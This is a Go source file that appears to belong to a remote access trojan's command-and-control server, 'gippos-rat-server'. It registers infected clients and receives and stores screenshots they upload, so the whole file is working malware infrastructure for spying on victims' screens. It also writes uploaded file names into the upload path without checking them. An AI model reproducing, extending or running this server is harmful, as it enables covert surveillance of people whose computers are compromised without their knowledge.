package handler

import (
	"fmt"
	"gippos-rat-server/internal/logger"
	"gippos-rat-server/internal/service"
	"io"
	"net/http"
	"os"
	"time"
)

type HandlerC2 struct {
	service *service.ServiceC2
}

func NewHandlerC2(service *service.ServiceC2) *HandlerC2 {
	return &HandlerC2{service: service}
}

func (h *HandlerC2) UploadScreen(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(10 << 20)

	clientID := r.FormValue("client_id")
	file, header, err := r.FormFile("file")
	if err != nil {
		logger.Log.Printf("Failed to get file: %v", err)
		http.Error(w, "Error loading file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	filename := fmt.Sprintf("%s_%d_%s", clientID, time.Now().Unix(), header.Filename)
	dst, err := os.Create("./uploads/" + filename)
	if err != nil {
		http.Error(w, "Error loading file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()
	filesize, _ := io.Copy(dst, file)

	h.service.SaveScreenshot(clientID, filename, filesize)

	fmt.Fprintf(w, "Screenshot uploaded successfully: %s\n", filename)
	fmt.Println("Screenshot received from the client:", clientID)
}

func (h *HandlerC2) Register(w http.ResponseWriter, r *http.Request) {
	clientID, err := h.service.RegisterClient()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Fprintf(w, "Client registered successfully: %s\n", clientID)
}
